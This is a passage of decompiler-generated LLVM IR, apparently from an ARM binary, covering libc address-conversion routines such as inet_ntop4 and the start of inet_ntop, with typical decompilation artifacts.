  store i32 %v1_19ed4, i32* %r3.global-to-local, align 4
  %v1_19ed8 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_19ed4, %v1_19ed8
  br i1 %tmp38, label %dec_label_pc_19ff0, label %dec_label_pc_19ee0

dec_label_pc_19ee0:                               ; preds = %dec_label_pc_19ed4
  %v0_19ee0 = load i32, i32* %r7.global-to-local, align 4
  %v3_19ee0 = udiv i32 %v0_19ee0, 256
  store i32 %v3_19ee0, i32* %r2.global-to-local, align 4
  store i32 %v0_19ed4, i32* %r3.global-to-local, align 4
  %v1_19ee8 = trunc i32 %v3_19ee0 to i8
  %v3_19ee8 = inttoptr i32 %v0_19ed4 to i8*
  store i8 %v1_19ee8, i8* %v3_19ee8, align 1
  %v4_19ee8 = load i32, i32* %r3.global-to-local, align 4
  %v5_19ee8 = add i32 %v4_19ee8, 1
  store i32 %v5_19ee8, i32* %r3.global-to-local, align 4
  %v0_19eec = load i32, i32* @r6, align 4
  store i32 %v0_19eec, i32* %sl.global-to-local, align 4
  %v0_19ef0 = load i32, i32* %r7.global-to-local, align 4
  %v1_19ef0 = trunc i32 %v0_19ef0 to i8
  %v2_19ef0 = load i32, i32* @r4, align 4
  %v3_19ef0 = add i32 %v2_19ef0, 1
  %v4_19ef0 = inttoptr i32 %v3_19ef0 to i8*
  store i8 %v1_19ef0, i8* %v4_19ef0, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_19ef8 = load i32, i32* %r3.global-to-local, align 4
  %v1_19ef8 = add i32 %v0_19ef8, 1
  store i32 %v1_19ef8, i32* @r4, align 4
  %v0_19f3c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_19f3c.backedge

dec_label_pc_19f04:                               ; preds = %dec_label_pc_19ea0
  %v7_19f04 = icmp eq i32 %v0_19ea0, 46
  br i1 %v7_19f04, label %dec_label_pc_19f0c, label %dec_label_pc_19ff0

dec_label_pc_19f0c:                               ; preds = %dec_label_pc_19f04
  %v0_19f0c = load i32, i32* @r4, align 4
  %v1_19f0c = add i32 %v0_19f0c, 4
  store i32 %v1_19f0c, i32* @r5, align 4
  %v1_19f10 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_19f0c, %v1_19f10
  br i1 %tmp39, label %dec_label_pc_19ff0, label %dec_label_pc_19f18

dec_label_pc_19f18:                               ; preds = %dec_label_pc_19f0c
  %v0_19f1c = load i32, i32* %sl.global-to-local, align 4
  %v1_19f1c = inttoptr i32 %v0_19f1c to i8*
  store i32 %v0_19f1c, i32* %r0.global-to-local, align 4
  %v4_19f20 = call i32 @inet_pton4(i8* %v1_19f1c, i32 %v0_19f0c)
  store i32 %v4_19f20, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_19f20, 1
  br i1 %tmp36, label %dec_label_pc_19ff0, label %bb

bb:                                               ; preds = %dec_label_pc_19f18
  %v5_19f28 = load i32, i32* @r5, align 4
  store i32 %v5_19f28, i32* @r4, align 4
  br label %dec_label_pc_19f78

dec_label_pc_19f34:                               ; preds = %dec_label_pc_19e8c
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_19f3c.backedge

dec_label_pc_19f3c.backedge:                      ; preds = %dec_label_pc_19f34, %dec_label_pc_19ebc, %dec_label_pc_19ee0
  %v0_19f3c = phi i32 [ %v1_19e84, %dec_label_pc_19ebc ], [ %v0_19f3c.pre, %dec_label_pc_19ee0 ], [ %v1_19e84, %dec_label_pc_19f34 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_19ebc ], [ 0, %dec_label_pc_19ee0 ], [ 1, %dec_label_pc_19f34 ]
  %v1_19f3c = inttoptr i32 %v0_19f3c to i8*
  %v2_19f3c = load i8, i8* %v1_19f3c, align 1
  %v3_19f3c = zext i8 %v2_19f3c to i32
  store i32 %v3_19f3c, i32* %r0.global-to-local, align 4
  %v1_19f40 = call i32 @__GI_tolower(i32 %v3_19f3c)
  store i32 %v1_19f40, i32* %r0.global-to-local, align 4
  store i32 %v1_19f40, i32* @r5, align 4
  %v2_19f44 = icmp eq i32 %v1_19f40, 0
  br i1 %v2_19f44, label %dec_label_pc_19f4c, label %dec_label_pc_19e70

dec_label_pc_19f4c:                               ; preds = %dec_label_pc_19f3c.backedge, %dec_label_pc_19e5c
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_19e5c ], [ %stack_var_-56.0.be, %dec_label_pc_19f3c.backedge ]
  %v4_19f4c3 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_19f4c3, i32* %r3.global-to-local, align 4
  %v2_19f50 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_19fbc.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_19f50, label %dec_label_pc_19f78, label %dec_label_pc_19f58

dec_label_pc_19f58:                               ; preds = %dec_label_pc_19f4c
  %v1_19f58 = add i32 %v0_19fbc.pre.pre, 2
  store i32 %v1_19f58, i32* %r3.global-to-local, align 4
  %v1_19f5c = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_19f58, %v1_19f5c
  br i1 %tmp40, label %dec_label_pc_19ff0, label %dec_label_pc_19f64

dec_label_pc_19f64:                               ; preds = %dec_label_pc_19f58
  store i32 %v0_19fbc.pre.pre, i32* %r3.global-to-local, align 4
  %v0_19f68 = load i32, i32* %r7.global-to-local, align 4
  %v3_19f68 = udiv i32 %v0_19f68, 256
  store i32 %v3_19f68, i32* %r2.global-to-local, align 4
  %v1_19f6c = trunc i32 %v3_19f68 to i8
  %v3_19f6c = inttoptr i32 %v0_19fbc.pre.pre to i8*
  store i8 %v1_19f6c, i8* %v3_19f6c, align 1
  %v4_19f6c = load i32, i32* %r3.global-to-local, align 4
  %v5_19f6c = add i32 %v4_19f6c, 1
  store i32 %v5_19f6c, i32* %r3.global-to-local, align 4
  %v0_19f70 = load i32, i32* %r7.global-to-local, align 4
  %v1_19f70 = trunc i32 %v0_19f70 to i8
  %v2_19f70 = load i32, i32* @r4, align 4
  %v3_19f70 = add i32 %v2_19f70, 1
  %v4_19f70 = inttoptr i32 %v3_19f70 to i8*
  store i8 %v1_19f70, i8* %v4_19f70, align 1
  %v0_19f74 = load i32, i32* %r3.global-to-local, align 4
  %v1_19f74 = add i32 %v0_19f74, 1
  store i32 %v1_19f74, i32* @r4, align 4
  br label %dec_label_pc_19f78

dec_label_pc_19f78:                               ; preds = %dec_label_pc_19f4c, %bb, %dec_label_pc_19f64
  %v0_19fbc.pre = phi i32 [ %v5_19f28, %bb ], [ %v1_19f74, %dec_label_pc_19f64 ], [ %v0_19fbc.pre.pre, %dec_label_pc_19f4c ]
  %v0_19f78 = load i32, i32* %fp.global-to-local, align 4
  %v2_19f78 = icmp eq i32 %v0_19f78, 0
  %v1_19fbc.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_19f78, label %dec_label_pc_19fbc, label %dec_label_pc_19f80

dec_label_pc_19f80:                               ; preds = %dec_label_pc_19f78
  %v9_19f80 = icmp eq i32 %v0_19fbc.pre, %v1_19fbc.pre
  %v2_19f84 = sub i32 %v0_19fbc.pre, %v0_19f78
  store i32 %v2_19f84, i32* %r0.global-to-local, align 4
  br i1 %v9_19f80, label %dec_label_pc_19ff0, label %dec_label_pc_19fa4.preheader

dec_label_pc_19fa4.preheader:                     ; preds = %dec_label_pc_19f80
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19fa4

dec_label_pc_19f94:                               ; preds = %dec_label_pc_19fa4
  %v0_19f94 = load i32, i32* %fp.global-to-local, align 4
  %v2_19f94 = add i32 %v0_19f94, %v2_19fa8
  %v3_19f94 = inttoptr i32 %v2_19f94 to i8*
  %v4_19f94 = load i8, i8* %v3_19f94, align 1
  %v3_19f98 = inttoptr i32 %v2_19fac to i8*
  store i8 %v4_19f94, i8* %v3_19f98, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_19fa0 = load i32, i32* %fp.global-to-local, align 4
  %v3_19fa0 = load i32, i32* %ip.global-to-local, align 4
  %v4_19fa0 = add i32 %v3_19fa0, %v2_19fa0
  %v5_19fa0 = inttoptr i32 %v4_19fa0 to i8*
  store i8 0, i8* %v5_19fa0, align 1
  %v0_19fa4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_19fa4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_19fac.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_19fa4

dec_label_pc_19fa4:                               ; preds = %dec_label_pc_19fa4.preheader, %dec_label_pc_19f94
  %v0_19fb8 = phi i32 [ %v1_19fbc.pre, %dec_label_pc_19fa4.preheader ], [ %v1_19fac.pre, %dec_label_pc_19f94 ]
  %v1_19fa8 = phi i32 [ %v2_19f84, %dec_label_pc_19fa4.preheader ], [ %v1_19fa4.pre, %dec_label_pc_19f94 ]
  %v0_19fb0 = phi i32 [ 1, %dec_label_pc_19fa4.preheader ], [ %v0_19fa4.pre, %dec_label_pc_19f94 ]
  %v2_19fa8 = sub i32 %v1_19fa8, %v0_19fb0
  store i32 %v2_19fa8, i32* %ip.global-to-local, align 4
  %v2_19fac = sub i32 %v0_19fb8, %v0_19fb0
  store i32 %v2_19fac, i32* @lr, align 4
  %v1_19fb0 = add i32 %v0_19fb0, 1
  store i32 %v1_19fb0, i32* %r2.global-to-local, align 4
  %v7_19fb4 = icmp slt i32 %v1_19fa8, %v0_19fb0
  br i1 %v7_19fb4, label %dec_label_pc_19fb8, label %dec_label_pc_19f94

dec_label_pc_19fb8:                               ; preds = %dec_label_pc_19fa4
  store i32 %v0_19fb8, i32* @r4, align 4
  br label %dec_label_pc_19fbc

dec_label_pc_19fbc:                               ; preds = %dec_label_pc_19f78, %dec_label_pc_19fb8
  %v0_19fbc = phi i32 [ %v0_19fb8, %dec_label_pc_19fb8 ], [ %v0_19fbc.pre, %dec_label_pc_19f78 ]
  %v1_19fbc = phi i32 [ %v0_19fb8, %dec_label_pc_19fb8 ], [ %v1_19fbc.pre, %dec_label_pc_19f78 ]
  %v9_19fbc = icmp eq i32 %v0_19fbc, %v1_19fbc
  br i1 %v9_19fbc, label %dec_label_pc_19fc4, label %dec_label_pc_19ff0

dec_label_pc_19fc4:                               ; preds = %dec_label_pc_19fbc
  store i32 16, i32* @r2, align 4
  %v2_19fc8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_19fc8, i32* @r0, align 4
  store i32 %v2_19e2c, i32* @r1, align 4
  %v0_19fd0 = call i32 @memcpy()
  store i32 %v0_19fd0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19ff4

dec_label_pc_19fdc:                               ; preds = %dec_label_pc_19e0c
  %v0_19fdc = call i32 @__errno_location()
  store i32 %v0_19fdc, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_19fe8 = inttoptr i32 %v0_19fdc to i32*
  store i32 97, i32* %v2_19fe8, align 4
  %v0_19ff4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19ff4

dec_label_pc_19ff0:                               ; preds = %dec_label_pc_19e8c, %dec_label_pc_19eb4, %dec_label_pc_19ed4, %dec_label_pc_19ec8, %dec_label_pc_19f18, %dec_label_pc_19f80, %dec_label_pc_19f04, %dec_label_pc_19fbc, %dec_label_pc_19e50, %dec_label_pc_19f58, %dec_label_pc_19f0c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19ff4

dec_label_pc_19ff4:                               ; preds = %dec_label_pc_19fdc, %dec_label_pc_19fc4, %dec_label_pc_19e18, %dec_label_pc_19ff0
  %v0_19ff4 = phi i32 [ %v0_19ff4.pre, %dec_label_pc_19fdc ], [ 1, %dec_label_pc_19fc4 ], [ %v4_19e20, %dec_label_pc_19e18 ], [ 0, %dec_label_pc_19ff0 ]
  store i32 %v0_19ff4, i32* %r0.global-to-local, align 4
  store i32 %v3_19df4, i32* @r4, align 4
  store i32 %v6_19df4, i32* @r5, align 4
  store i32 %v9_19df4, i32* @r6, align 4
  ret i32 %v0_19ff4

; uselistorder directives
  uselistorder i32 %v0_19ff4, { 1, 0 }
  uselistorder i32 %v2_19fac, { 1, 0 }
  uselistorder i32 %v2_19fa8, { 1, 0 }
  uselistorder i32 %v0_19fb0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_19fb8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_19fbc.pre, { 0, 2, 1 }
  uselistorder i32 %v0_19fbc.pre, { 2, 0, 1 }
  uselistorder i32 %v3_19f68, { 1, 0 }
  uselistorder i32 %v0_19fbc.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_19f40, { 1, 2, 3, 0 }
  uselistorder i32 %v0_19f1c, { 1, 0 }
  uselistorder i32 %v3_19ee0, { 1, 0 }
  uselistorder i32 %v0_19ed4, { 1, 0, 2 }
  uselistorder i32 %v1_19e84, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_19e7c, { 1, 0 }
  uselistorder i32 %v0_19e60, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 7, 5, 6, 13, 12, 9, 8, 11, 10, 2, 1, 15, 14, 17, 16, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 1, { 4, 0, 3, 6, 7, 1, 2, 8, 5, 9, 10, 11, 12 }
  uselistorder i32 58, { 3, 0, 1, 2, 4 }
  uselistorder i32 (i32)* @__GI_tolower, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19ff4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_19ff0, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_19fbc, { 1, 0 }
  uselistorder label %dec_label_pc_19fa4, { 1, 0 }
  uselistorder label %dec_label_pc_19f78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19f3c.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_19e70, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1a004 = load i32, i32* @r4, align 4
  store i32 %v3_1a004, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_1e250.1184 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_1a020 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_1a020, i32* @r0, align 4
  %v0_1a024 = call i32 @memcpy()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_1a034 = bitcast i32* %stack_var_-51 to i8*
  %v3_1a034 = call i32 @__GI_memset(i8* %v2_1a034, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1a0fc = ptrtoint i32* %stack_var_-36 to i32
  %v2_1a0d8 = add i32 %v2_1a0fc, -17
  br label %dec_label_pc_1a0fc

dec_label_pc_1a044:                               ; preds = %dec_label_pc_1a0fc
  %v0_1a044 = load i32, i32* %fp.global-to-local, align 4
  %v2_1a044 = add i32 %v0_1a044, %v1_1a044
  %v3_1a044 = inttoptr i32 %v2_1a044 to i8*
  %v4_1a044 = load i8, i8* %v3_1a044, align 1
  %v6_1a044 = zext i8 %v4_1a044 to i32
  store i32 %v6_1a044, i32* %r4.global-to-local, align 4
  %v1_1a048 = add i32 %v0_1a048, 1
  store i32 %v1_1a048, i32* %r7.global-to-local, align 4
  store i32 %v2_1a0fc, i32* %r2.global-to-local, align 4
  %v2_1a054 = add i32 %v1_1a048, %v2_1a0fc
  store i32 %v2_1a054, i32* %sl.global-to-local, align 4
  %div = udiv i8 %v4_1a044, 100
  %v1_1a05c = or i8 %div, 48
  %v3_1a060 = add i32 %v2_1a10c, -17
  %v4_1a060 = inttoptr i32 %v3_1a060 to i8*
  store i8 %v1_1a05c, i8* %v4_1a060, align 1
  %v0_1a064 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a064 = add i32 %v0_1a064, -17
  %v2_1a064 = inttoptr i32 %v1_1a064 to i8*
  %v3_1a064 = load i8, i8* %v2_1a064, align 1
  %v7_1a068 = icmp eq i8 %v3_1a064, 48
  %v0_1a06c = load i32, i32* %fp.global-to-local, align 4
  %v1_1a06c = load i32, i32* %r8.global-to-local, align 4
  %v2_1a06c = add i32 %v1_1a06c, %v0_1a06c
  store i32 %v2_1a06c, i32* %sb.global-to-local, align 4
  %v0_1a074 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a07c = udiv i32 %v0_1a074, 10
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1a084 = urem i32 %v2_1a07c, 256
  %v2_1a088 = urem i32 %v1_1a084, 10
  %v1_1a08c = or i32 %v2_1a088, 48
  %v1_1a090 = trunc i32 %v1_1a08c to i8
  br i1 %v7_1a068, label %dec_label_pc_1a07c, label %dec_label_pc_1a0a4

dec_label_pc_1a07c:                               ; preds = %dec_label_pc_1a044
  store i8 %v1_1a090, i8* %v2_1a064, align 1
  %v0_1a094 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a094 = add i32 %v0_1a094, -17
  %v2_1a094 = inttoptr i32 %v1_1a094 to i8*
  %v3_1a094 = load i8, i8* %v2_1a094, align 1
  %v7_1a098 = icmp eq i8 %v3_1a094, 48
  br i1 %v7_1a098, label %dec_label_pc_1a07c.dec_label_pc_1a0c8_crit_edge, label %bb

dec_label_pc_1a07c.dec_label_pc_1a0c8_crit_edge:  ; preds = %dec_label_pc_1a07c
  %v1_1a0d8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a0c8

bb:                                               ; preds = %dec_label_pc_1a07c
  %v1_1a09c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1a09c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a0c8

dec_label_pc_1a0a4:                               ; preds = %dec_label_pc_1a044
  %v2_1a0c0 = load i32, i32* %sl.global-to-local, align 4
  %v3_1a0c0 = add i32 %v2_1a0c0, -17
  %v4_1a0c0 = inttoptr i32 %v3_1a0c0 to i8*
  store i8 %v1_1a090, i8* %v4_1a0c0, align 1
  %v0_1a0c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a0c4 = add i32 %v0_1a0c4, 1
  store i32 %v1_1a0c4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a0c8

dec_label_pc_1a0c8:                               ; preds = %dec_label_pc_1a07c.dec_label_pc_1a0c8_crit_edge, %bb, %dec_label_pc_1a0a4
  %v1_1a0d8 = phi i32 [ %v1_1a0d8.pre, %dec_label_pc_1a07c.dec_label_pc_1a0c8_crit_edge ], [ %v1_1a09c, %bb ], [ %v1_1a0c4, %dec_label_pc_1a0a4 ]
  %v0_1a0c8 = load i32, i32* %sb.global-to-local, align 4
  %v1_1a0c8 = inttoptr i32 %v0_1a0c8 to i8*
  %v2_1a0c8 = load i8, i8* %v1_1a0c8, align 1
  %tmp17 = urem i8 %v2_1a0c8, 10
  store i32 %v2_1a0fc, i32* %ip.global-to-local, align 4
  %v1_1a0dc = add i32 %v1_1a0d8, 1
  store i32 %v1_1a0dc, i32* %r1.global-to-local, align 4
  %v1_1a0e0 = or i8 %tmp17, 48
  %v3_1a0e4 = add i32 %v2_1a0d8, %v1_1a0d8
  %v4_1a0e4 = inttoptr i32 %v3_1a0e4 to i8*
  store i8 %v1_1a0e0, i8* %v4_1a0e4, align 1
  %v0_1a0e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_1a0e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a0e8 = add i32 %v1_1a0e8, %v0_1a0e8
  store i32 %v2_1a0e8, i32* %r2.global-to-local, align 4
  %v3_1a0f0 = add i32 %v2_1a0e8, -17
  %v4_1a0f0 = inttoptr i32 %v3_1a0f0 to i8*
  store i8 46, i8* %v4_1a0f0, align 1
  %v0_1a0f4 = load i32, i32* %r8.global-to-local, align 4
  %v1_1a0f4 = add i32 %v0_1a0f4, 1
  store i32 %v1_1a0f4, i32* %r8.global-to-local, align 4
  %v0_1a0f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a0f8 = add i32 %v0_1a0f8, 1
  br label %dec_label_pc_1a0fc

dec_label_pc_1a0fc:                               ; preds = %entry, %dec_label_pc_1a0c8
  %v0_1a048 = phi i32 [ 0, %entry ], [ %v1_1a0f8, %dec_label_pc_1a0c8 ]
  %v1_1a044 = phi i32 [ 0, %entry ], [ %v1_1a0f4, %dec_label_pc_1a0c8 ]
  store i32 %v2_1a0fc, i32* %r2.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_1a048, i32* %r6.global-to-local, align 4
  %v2_1a10c = add i32 %v0_1a048, %v2_1a0fc
  store i32 %v2_1a10c, i32* %r5.global-to-local, align 4
  %v7_1a110 = icmp sgt i32 %v1_1a044, 3
  br i1 %v7_1a110, label %dec_label_pc_1a114, label %dec_label_pc_1a044

dec_label_pc_1a114:                               ; preds = %dec_label_pc_1a0fc
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_1a020, i32* %r4.global-to-local, align 4
  %v3_1a11c = add i32 %v2_1a10c, -18
  %v4_1a11c = inttoptr i32 %v3_1a11c to i8*
  store i8 0, i8* %v4_1a11c, align 1
  %tmp18 = bitcast i32* %stack_var_-53 to i8*
  %v3_1a124 = call i32 @strlen(i8* %tmp18)
  %v2_1a128 = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v3_1a124, %v2_1a128
  br i1 %tmp, label %dec_label_pc_1a134, label %dec_label_pc_1a148

dec_label_pc_1a134:                               ; preds = %dec_label_pc_1a114
  %v0_1a134 = call i32 @__errno_location()
  %v0_1a13c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1a13c, i32* %r2.global-to-local, align 4
  %v2_1a140 = inttoptr i32 %v0_1a134 to i32*
  store i32 28, i32* %v2_1a140, align 4
  %v0_1a158.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a158

dec_label_pc_1a148:                               ; preds = %dec_label_pc_1a114
  store i32 %v2_1a020, i32* %r1.global-to-local, align 4
  %v3_1a150 = call i32 @strcpy(i32 %arg2, i8* %tmp18)
  store i32 %v3_1a150, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a158

dec_label_pc_1a158:                               ; preds = %dec_label_pc_1a134, %dec_label_pc_1a148
  %v0_1a158 = phi i32 [ %v0_1a158.pre, %dec_label_pc_1a134 ], [ %v3_1a150, %dec_label_pc_1a148 ]
  %v2_1a160 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1a160, i32* @r4, align 4
  ret i32 %v0_1a158

; uselistorder directives
  uselistorder i32 %v2_1a10c, { 0, 2, 1 }
  uselistorder i32 %v1_1a044, { 1, 0 }
  uselistorder i32 %v0_1a048, { 0, 2, 1 }
  uselistorder i32 %v2_1a0fc, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 3, 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 4, 5, 3, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 2, 6, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 2, 5, 6, 7, 1, 3, 0 }
  uselistorder i8 10, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i8 48, { 0, 8, 9, 1, 4, 5, 6, 10, 11, 12, 13, 14, 15, 2, 3, 16, 7 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_1a158, { 1, 0 }
  uselistorder label %dec_label_pc_1a0fc, { 1, 0 }
  uselistorder label %dec_label_pc_1a0c8, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1a168 = load i32, i32* @r4, align 4
  store i32 %v3_1a168, i32* %stack_var_-32, align 4
  %v6_1a168 = load i32, i32* @r5, align 4
  %v25_1a168 = ptrtoint i32* %stack_var_-32 to i32
  %v7_1a16c = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_1a16c, label %dec_label_pc_1a190, label %dec_label_pc_1a184

dec_label_pc_1a184:                               ; preds = %entry
  %v7_1a184 = icmp eq i32 %arg1, 10
  br i1 %v7_1a184, label %dec_label_pc_1a1a4, label %dec_label_pc_1a3a4

dec_label_pc_1a190:                               ; preds = %entry
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_1a19c = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1a39c

dec_label_pc_1a1a4:                               ; preds = %dec_label_pc_1a184
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_1a1b0 = bitcast i32* %stack_var_-64 to i8*
  %v3_1a1b0 = call i32 @__GI_memset(i8* %v2_1a1b0, i32 0)
  br label %dec_label_pc_1a1d0

dec_label_pc_1a1bc:                               ; preds = %dec_label_pc_1a1d0
  %tmp68 = icmp slt i32 %v1_1a1c0, 0
  %v4_1a1d0 = zext i1 %tmp68 to i32
  %v5_1a1d0 = add i32 %v4_1a1d0, %v1_1a1c0
  %v3_1a1d4 = sdiv i32 %v5_1a1d0, 2
  %v4_1a1e4 = mul i32 %v3_1a1d4, 4
  %v5_1a1e4 = add i32 %v4_1a1e4, %v25_1a168
  %v1_1a1bc = add i32 %v2_1a1e0, 1
  %v2_1a1bc = inttoptr i32 %v1_1a1bc to i8*
  %v3_1a1bc = load i8, i8* %v2_1a1bc, align 1
  %v4_1a1bc = zext i8 %v3_1a1bc to i32
  %v3_1a1c0 = inttoptr i32 %v2_1a1e0 to i8*
  %v4_1a1c0 = load i8, i8* %v3_1a1c0, align 1
  %v6_1a1c0 = zext i8 %v4_1a1c0 to i32
  store i32 %v6_1a1c0, i32* %r2.global-to-local, align 4
  %v4_1a1c4 = mul nuw nsw i32 %v6_1a1c0, 256
  %v5_1a1c4 = or i32 %v4_1a1c4, %v4_1a1bc
  %v2_1a1c8 = add i32 %v5_1a1e4, -32
  %v3_1a1c8 = inttoptr i32 %v2_1a1c8 to i32*
  store i32 %v5_1a1c4, i32* %v3_1a1c8, align 4
  %v0_1a1cc = load i32, i32* %r1.global-to-local, align 4
  %v1_1a1cc = add i32 %v0_1a1cc, 2
  br label %dec_label_pc_1a1d0

dec_label_pc_1a1d0:                               ; preds = %dec_label_pc_1a1a4, %dec_label_pc_1a1bc
  %v1_1a1c0 = phi i32 [ 0, %dec_label_pc_1a1a4 ], [ %v1_1a1cc, %dec_label_pc_1a1bc ]
  store i32 %v1_1a1c0, i32* %r1.global-to-local, align 4
  %v0_1a1e0 = load i32, i32* @r8, align 4
  %v2_1a1e0 = add i32 %v0_1a1e0, %v1_1a1c0
  store i32 %v2_1a1e0, i32* %r2.global-to-local, align 4
  %v7_1a1e8 = icmp sgt i32 %v1_1a1c0, 15
  br i1 %v7_1a1e8, label %dec_label_pc_1a1ec, label %dec_label_pc_1a1bc

dec_label_pc_1a1ec:                               ; preds = %dec_label_pc_1a1d0
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a1fc

